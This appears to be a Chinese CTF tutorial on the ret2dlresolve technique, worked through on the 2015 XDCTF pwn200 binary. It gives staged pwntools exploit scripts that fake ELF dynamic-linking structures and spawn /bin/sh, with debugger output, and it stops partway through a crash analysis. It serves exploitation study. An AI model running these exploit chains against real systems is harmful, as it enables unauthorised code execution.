# ret2dlresolve

在學習這個 ROP 利用技巧前，需要首先理解動態鏈接的基本過程以及 ELF 文件中動態鏈接相關的結構。讀者可以參考 executable 部分  ELF 對應的介紹。這裏只給出相應的利用方式。

## 原理

在 Linux 中，程序使用 `_dl_runtime_resolve(link_map_obj, reloc_offset)` 來對動態鏈接的函數進行重定位。那麼如果我們可以控制相應的參數及其對應地址的內容是不是就可以控制解析的函數了呢？答案是肯定的。這也是 ret2dlresolve 攻擊的核心所在。

具體的，動態鏈接器在解析符號地址時所使用的重定位表項、動態符號表、動態字符串表都是從目標文件中的動態節 `.dynamic` 索引得到的。所以如果我們能夠修改其中的某些內容使得最後動態鏈接器解析的符號是我們想要解析的符號，那麼攻擊就達成了。

### 思路1 - 直接控制重定位表項的相關內容

由於動態鏈接器最後在解析符號的地址時，是依據符號的名字進行解析的。因此，一個很自然的想法是直接修改動態字符串表 `.dynstr`，比如把某個函數在字符串表中對應的字符串修改爲目標函數對應的字符串。但是，動態字符串表和代碼映射在一起，是隻讀的。此外，類似地，我們可以發現動態符號表、重定位表項都是隻讀的。

但是，假如我們可以控制程序執行流，那我們就可以僞造合適的重定位偏移，從而達到調用目標函數的目的。然而，這種方法比較麻煩，因爲我們不僅需要僞造重定位表項，符號信息和字符串信息，而且我們還需要確保動態鏈接器在解析的過程中不會出錯。

### 思路2 - 間接控制重定位表項的相關內容

既然動態鏈接器會從 `.dynamic` 節中索引到各個目標節，那如果我們可以修改動態節中的內容，那自然就很容易控制待解析符號對應的字符串，從而達到執行目標函數的目的。

### 思路3 - 僞造 link_map

由於動態連接器在解析符號地址時，主要依賴於 link_map 來查詢相關的地址。因此，如果我們可以成功僞造 link_map，也就可以控制程序執行目標函數。

下面我們以 2015-XDCTF-pwn200 來介紹 32 位和 64 位下如何使用 ret2dlresolve 技巧。

## 32 位例子

### NO RELRO

首先，我們可以按照下面的方式來編譯對應的文件。

```shell
❯ gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32
❯ checksec main_no_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

在這種情況下，修改 `.dynamic` 會簡單些。因爲我們只需要修改 `.dynamic` 節中的字符串表的地址爲僞造的字符串表的地址，並且相應的位置爲目標字符串基本就行了。具體思路如下

1. 修改 .dynamic 節中字符串表的地址爲僞造的地址
2. 在僞造的地址處構造好字符串表，將 read 字符串替換爲 system 字符串。
3. 在特定的位置讀取 /bin/sh 字符串。
4. 調用 read 函數的 plt 的第二條指令，觸發 `_dl_runtime_resolve` 進行函數解析，從而執行 system 函數。

代碼如下

```python
from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="i386"
p = process("./main_no_relro_32")
rop = ROP("./main_no_relro_32")
elf = ELF("./main_no_relro_32")

p.recvuntil('Welcome to XDCTF2015~!\n')

offset = 112
rop.raw(offset*'a')
rop.read(0,0x08049804+4,4) # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.read(0,0x080498E0,len((dynstr))) # construct a fake dynstr section
rop.read(0,0x080498E0+0x100,len("/bin/sh\x00")) # read /bin/sh\x00
rop.raw(0x08048376) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw(0x080498E0+0x100)
# print(rop.dump())
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
p.send(rop.chain())
p.send(p32(0x080498E0))
p.send(dynstr)
p.send("/bin/sh\x00")
p.interactive()
```

運行效果如下

```python
❯ python exp-no-relro.py
[+] Starting local process './main_no_relro_32': pid 35093
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './main_no_relro_32'
[*] Switching to interactive mode
$ ls
exp-no-relro.py  main_no_relro_32
```

### Partial RELRO

首先我們可以編譯源文件 main.c 得到二進制文件，這裏取消了 Canary 保護。

```shell
❯ gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie ../../main.c -o main_partial_relro_32
❯ checksec main_partial_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/parti
al-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

在這種情況下，ELF 文件中的 .dynamic 節將會變成只讀的，這時我們可以通過僞造重定位表項的方式來調用目標函數。

在下面的講解過程中，本文會按照以下兩種不同的方式來使用該技巧。

1.  通過手工僞造的方式使用該技巧，從而獲取 shell。這種方式雖然比較麻煩，但是可以仔細理解 ret2dlresolve 的原理。
2.  利用工具來實現攻擊，從而獲取 shell。這種方式比較簡單，但我們還是應該充分理解背後的原理，不能只是會使用工具。

#### 手工僞造

這題我們不考慮有 libc 的情況。通過分析，我們可以發現程序有一個很明顯的棧溢出漏洞，緩衝區到返回地址間的偏移爲 112。

```asm
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r
Starting program: /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
Welcome to XDCTF2015~!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xc9
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xffffcddc  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edx   : 0x100
$esp   : 0xffffce50  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0xf7fb0000  →  0x001d7d6c
$edi   : 0xffffcec0  →  0x00000001
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────── stack ────
0xffffce50│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"	 ← $esp
0xffffce54│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffce58│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffce5c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffce60│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffce64│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffce68│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffce6c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
─────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
─────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main_partial_re", stopped 0x62616164 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────
0x62616164 in ?? ()
gef➤  pattern search 0x62616164
[+] Searching '0x62616164'
[+] Found at offset 112 (little-endian search) likely
```

在下面的每一個階段中，我們會一步步地深入理解如何構造 payload。

##### stage 1

在這一階段，我們的目的比較簡單，就是控制程序直接執行 write 函數。在棧溢出的情況下，我們其實可以直接控制返回地址來控制程序直接執行 write 函數。但是這裏我們採用一個相對複雜點的辦法，即先使用棧遷移，將棧遷移到 bss 段，然後再來控制 write 函數。因此，這一階段主要包括兩步

1. 將棧遷移到 bss 段。
2. 通過 write 函數的 plt 表項來執行 write 函數，輸出相應字符串。

這裏使用了 pwntools 中的 ROP 模塊。具體代碼如下

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"
rop.write(1, base_stage + 80, len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())

r.interactive()
```

結果如下

```shell
❯ python stage1.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 25112
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 2

在這一階段，我們將會進一步利用 `_dl_runtime_resolve` 相關的知識來控制程序執行 write 函數。

1. 將棧遷移到 bss 段。
2. 控制程序直接執行 plt0 中的相關指令，即 push linkmap 以及跳轉到 `_dl_runtime_resolve` 函數。這時，我們還需要提供  write 重定位項在 got 表中的偏移。這裏，我們可以直接使用 write plt 中提供的偏移，即 0x080483C6 處所給出的 0x20。其實，我們也可以跳轉到 0x080483C6 地址處，利用原有的指令來提供 write 函數的偏移，並跳轉到 plt0。

```
.plt:08048370 ; ===========================================================================
.plt:08048370
.plt:08048370 ; Segment type: Pure code
.plt:08048370 ; Segment permissions: Read/Execute
.plt:08048370 _plt            segment para public 'CODE' use32
.plt:08048370                 assume cs:_plt
.plt:08048370                 ;org 8048370h
.plt:08048370                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.plt:08048370
.plt:08048370 ; =============== S U B R O U T I N E =======================================
.plt:08048370
.plt:08048370
.plt:08048370 sub_8048370     proc near               ; CODE XREF: .plt:0804838B↓j
.plt:08048370                                         ; .plt:0804839B↓j ...
.plt:08048370 ; __unwind {
.plt:08048370                 push    ds:dword_804A004
.plt:08048376                 jmp     ds:dword_804A008
.plt:08048376 sub_8048370     endp
.plt:08048376
...
.plt:080483C0 ; =============== S U B R O U T I N E =======================================
.plt:080483C0
.plt:080483C0 ; Attributes: thunk
.plt:080483C0
.plt:080483C0 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:080483C0 _write          proc near               ; CODE XREF: main+8A↓p
.plt:080483C0
.plt:080483C0 fd              = dword ptr  4
.plt:080483C0 buf             = dword ptr  8
.plt:080483C0 n               = dword ptr  0Ch
.plt:080483C0
.plt:080483C0                 jmp     ds:off_804A01C
.plt:080483C0 _write          endp
.plt:080483C0
.plt:080483C6 ; ---------------------------------------------------------------------------
.plt:080483C6                 push    20h ; ' '
.plt:080483CB                 jmp     sub_8048370
```

具體代碼如下

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
jmprel_data = elf.get_section_by_name('.rel.plt').data()
writegot = elf.got["write"]
write_reloc_offset = jmprel_data.find(p32(writegot,endian="little"))
print(write_reloc_offset)
rop.raw(plt0)
rop.raw(write_reloc_offset)
# fake ret addr of write
rop.raw('bbbb')
# fake write args, write(1, base_stage+80, sh)
rop.raw(1)  
rop.raw(base_stage + 80)
sh = "/bin/sh"
rop.raw(len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

效果如下，仍然輸出了 sh 對應的字符串。

```shell
❯ python stage2.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 25131
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
32
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 3

這一次，我們同樣控制  `_dl_runtime_resolve` 函數中的 reloc_offset 參數，不過這次控制其指向我們僞造的 write 重定位項。

鑑於 pwntools 本身並不支持對重定位表項的信息的獲取。這裏我們手動看一下

```shell
❯ readelf -r main_partial_relro_32

Relocation section '.rel.dyn' at offset 0x30c contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff4  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
08049ff8  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0
08049ffc  00000806 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x324 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
```

可以看出 write 的重定表項的 r_offset=0x0804a01c，r_info=0x00000607。具體代碼如下

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
got0 = elf.get_section_by_name('.got').header.sh_addr

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
# make base_stage+24 ---> fake reloc
write_reloc_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = 0x607

rop.raw(plt0)
rop.raw(write_reloc_offset)
# fake ret addr of write
rop.raw('bbbb')
# fake write args, write(1, base_stage+80, sh)
rop.raw(1)  
rop.raw(base_stage + 80)
sh = "/bin/sh"
rop.raw(len(sh))
# construct fake write relocation entry
rop.raw(write_got)
rop.raw(r_info)
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

這次我們在 base_stage+24 處僞造了一個 write 的重定位項，仍然輸出了對應的字符串。

```shell
❯ python stage3.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 24506
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 4

在 stage3 中，我們控制了重定位表項，但是僞造的重定位表項的內容仍然與 write 函數原來的重定位表項一致。

在這個階段中，我們將構造屬於我們自己的重定位表項，並且僞造該表項對應的符號。首先，我們根據 write 的重定位表項的 r_info=0x607 可以知道，write 對應的符號在符號表的下標爲 0x607>>8=0x6。因此，我們知道 write 對應的符號地址爲 0x0804822c。

```shell
❯ readelf -x .dynsym main_partial_relro_32

Hex dump of section '.dynsym':
  0x080481cc 00000000 00000000 00000000 00000000 ................
  0x080481dc 33000000 00000000 00000000 12000000 3...............
  0x080481ec 27000000 00000000 00000000 12000000 '...............
  0x080481fc 5c000000 00000000 00000000 20000000 \........... ...
  0x0804820c 20000000 00000000 00000000 12000000  ...............
  0x0804821c 3a000000 00000000 00000000 12000000 :...............
  0x0804822c 4c000000 00000000 00000000 12000000 L...............
  0x0804823c 1a000000 00000000 00000000 11000000 ................
  0x0804824c 2c000000 00000000 00000000 11000000 ,...............
  0x0804825c 0b000000 6c860408 04000000 11001000 ....l...........
```

這裏給出的其實是小端模式，因此我們需要手工轉換。此外，每個符號佔用的大小爲 16 個字節。

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

直接執行後發現並不行

```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27370
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

發現程序已經崩潰了，通過 coredump，可以發現程序在 `ld-linux.so.2` 中崩了。

```assembly
 ► 0xf7f77fed    mov    ebx, dword ptr [edx + 4]
   0xf7f77ff0    test   ebx, ebx
   0xf7f77ff2    mov    ebx, 0
   0xf7f77ff7    cmove  edx, ebx
   0xf7f77ffa    mov    esi, dword ptr gs:[0xc]
   0xf7f78001    test   esi, esi
   0xf7f78003    mov    ebx, 1
   0xf7f78008    jne    0xf7f78078 <0xf7f78078>
    ↓
   0xf7f78078    mov    dword ptr gs:[0x1c], 1
   0xf7f78083    mov    ebx, 5
   0xf7f78088    jmp    0xf7f7800a <0xf7f7800a>
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0x804a7dc ◂— 0x0
... ↓
02:0008│      0x804a7e4 —▸ 0xf7f90000 ◂— 0x26f34
03:000c│      0x804a7e8 —▸ 0x804826c ◂— add    byte ptr [ecx + ebp*2 + 0x62], ch
04:0010│      0x804a7ec ◂— 0x0
... ↓
07:001c│      0x804a7f8 —▸ 0x804a84c ◂— 0x4c /* 'L' */
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► f 0 f7f77fed
   f 1        0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x804a000 r-xp     2000 0      ./main_partial_relro_32
 0x8049000  0x804b000 rw-p     2000 0      [stack]
 0x804a000  0x804b000 rw-p     1000 1000   ./main_partial_relro_32
0xf7d6b000 0xf7f40000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc.so.6
0xf7f40000 0xf7f41000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f41000 0xf7f43000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f43000 0xf7f47000 rw-p     4000 1d7000 /lib/i386-linux-gnu/libc.so.6
0xf7f67000 0xf7f69000 r-xp     2000 0      [vdso]
0xf7f69000 0xf7f90000 r-xp    27000 0      [linker]
0xf7f69000 0xf7f90000 r-xp    27000 0      /lib/ld-linux.so.2
0xf7f90000 0xf7f91000 rw-p     1000 26000  [linker]
0xf7f90000 0xf7f91000 rw-p     1000 26000  /lib/ld-linux.so.2
```

通過逆向分析 ld-linux.so.2 

```c
  if ( v9 )
  {
    v10 = (char *)a1[92] + 16 * (*(_WORD *)(*((_DWORD *)v9 + 1) + 2 * v4) & 0x7FFF);
    if ( !*((_DWORD *)v10 + 1) )
      v10 = 0;
  }
```

以及源碼可以知道程序是在訪問 version 的 hash 時出錯。

```c
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum =
                (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
```

進一步分析可以知道，因爲我們僞造了 write 函數的重定位表項，其中 reloc->r_info 被設置成了比較大的值（由於 index_dynsym 離符號表比較遠）。這時候，ndx 的值並不可預期，進而 version 的值也不可預期，因此可能出現不可預期的情況。

通過分析 .dynmic 節，我們可以發現 vernum 的地址爲 0x80482d8。

```
❯ readelf -d main_partial_relro_32

Dynamic section at offset 0xf0c contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x804834c
 0x0000000d (FINI)                       0x8048654
 0x00000019 (INIT_ARRAY)                 0x8049f04
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f08
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804826c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      107 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   40 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048324
 0x00000011 (REL)                        0x804830c
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482ec
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482d8
 0x00000000 (NULL)                       0x0
```

在 ida 中，我們也可以看到相關的信息

```assembly
LOAD:080482D8 ; ELF GNU Symbol Version Table
LOAD:080482D8                 dw 0
LOAD:080482DA                 dw 2                    ; setbuf@@GLIBC_2.0
LOAD:080482DC                 dw 2                    ; read@@GLIBC_2.0
LOAD:080482DE                 dw 0                    ; local  symbol: __gmon_start__
LOAD:080482E0                 dw 2                    ; strlen@@GLIBC_2.0
LOAD:080482E2                 dw 2                    ; __libc_start_main@@GLIBC_2.0
LOAD:080482E4                 dw 2                    ; write@@GLIBC_2.0
LOAD:080482E6                 dw 2                    ; stdin@@GLIBC_2.0
LOAD:080482E8                 dw 2                    ; stdout@@GLIBC_2.0
LOAD:080482EA                 dw 1                    ; global symbol: _IO_stdin_used
```

那我們可以再次運行看一下僞造後 ndx 具體的值

```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27649
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487a8
```

可以發現，ndx_落入了 `.eh_frame` 節中。

```assembly
.eh_frame:080487A8                 dw 442Ch
```

進一步地，ndx 的值爲 0x442C。顯然不知道會索引到哪裏去。

```c
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum =
                (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
```

通過動態調試，我們可以發現 l_versions 的起始地址，並且其中一共有 3 個元素。

```assembly
pwndbg> print *((struct link_map *)0xf7f0d940)
$4 = {
  l_addr = 0, 
  l_name = 0xf7f0dc2c "", 
  l_ld = 0x8049f0c, 
  l_next = 0xf7f0dc30, 
  l_prev = 0x0, 
  l_real = 0xf7f0d940, 
  l_ns = 0, 
  l_libname = 0xf7f0dc20, 
  l_info = {0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 <repeats 13 times>, 0x8049fbc, 0x0 <repeats 25 times>, 0x8049f44}, 
  l_phdr = 0x8048034, 
  l_entry = 134513632, 
  l_phnum = 9, 
  l_ldnum = 0, 
  l_searchlist = {
    r_list = 0xf7edf3e0, 
    r_nlist = 3
  }, 
  l_symbolic_searchlist = {
    r_list = 0xf7f0dc1c, 
    r_nlist = 0
  }, 
  l_loader = 0x0, 
  l_versions = 0xf7edf3f0, 
  l_nversions = 3, 
```

對應的分別爲 

```assembly
pwndbg> print *((struct r_found_version[3] *)0xf7edf3f0)
$13 = {{
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x80482be "GLIBC_2.0", 
    hash = 225011984, 
    hidden = 0, 
    filename = 0x804826d "libc.so.6"
  }}

```

此時，計算得到的 version 地址爲 0xf7f236b0，顯然不在映射的內存區域。

```assembly
pwndbg> print /x 0xf7edf3f0+0x442C*16
$16 = 0xf7f236b0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x8049000  0x804a000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x804a000  0x804b000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
0xf7ce8000 0xf7ebd000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7ebd000 0xf7ebe000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
